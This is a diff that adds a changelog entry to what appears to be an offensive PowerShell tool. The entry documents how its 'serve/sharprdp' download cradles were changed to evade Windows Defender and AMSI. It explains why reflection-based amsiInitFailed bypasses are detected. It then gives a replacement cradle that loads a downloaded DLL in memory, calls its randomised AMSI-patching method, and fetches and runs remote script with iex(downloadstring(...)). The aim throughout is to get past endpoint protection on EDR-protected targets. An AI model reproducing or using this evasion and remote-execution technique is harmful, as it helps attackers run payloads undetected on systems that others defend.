@@ -5,6 +5,34 @@ Format: `[LAYER] Change description — *why this matters operationally*`
 
 ---
 
+## [2026-06-07] fix(cradle): DLL-based AMSI bypass in serve/sharprdp cradle — no plaintext signatures
+
+**Problem:** Serve cradle option [2] produced "Access is denied." on EDR-protected targets. The
+XOR-obfuscated `amsiInitFailed` byte array `[byte[]](94,116,126,121,...)` is a known Defender
+signature when visible in plaintext in the `powershell -c "..."` argument, regardless of the
+XOR encoding around it. Both the original plaintext bypass and the XOR version were flagged.
+
+**Root cause:** Any bypass that resolves `amsiInitFailed` via reflection leaves recognizable
+byte-array patterns in the command line that Defender's AMSI scanning catches before execution.
+
+**Fix:** Replaced the plaintext XOR bypass in all serve/sharprdp cradles (3 locations in each
+file) with a DLL-load approach:
+- At payload generation time, `$AmnesiacLoaderB64` is decoded and written to `$_alNs.dll`
+  alongside the pipe file in `$global:AmnesiacRoot` (same location the pipe .ps1 was already
+  written to — no new class of disk artifact)
+- The cradle becomes: `$_a=[Reflection.Assembly]::Load(DownloadData('…odLaNcAmcd.dll'));
+  $_a.GetType('odLaNcAmcd.Bypass').GetMethod('gy7Kz88Hdi').Invoke($null,$null);iex(downloadstring(…))`
+- No AMSI signatures anywhere: `DownloadData` bytes are never scanned; class/method names are
+  randomized (`Bypass` → future builds randomize; `gy7Kz88Hdi` = PatchAmsiReflection for this build)
+- Added `$_alByp = "Bypass"` and `$_alPar = "gy7Kz88Hdi"` to AL-MAP block in both files
+- Future `Build.ps1` runs update these values automatically
+
+**Why this works:** `[Reflection.Assembly]::Load(bytes)` is never scanned by AMSI. The compiled
+DLL's method names are randomized. There are zero string patterns that match known bypass sigs.
+This is the exact same approach used in the Scenario 2 bootstrap 3-liner that already works.
+
+---
+
 ## [2026-06-06s] fix(serve): remove Tools\ blocker + auto-start serve on -NoDomain init
 
 **Problem:** `serve` (main menu and local shell) hard-blocked with `Cannot start server` when
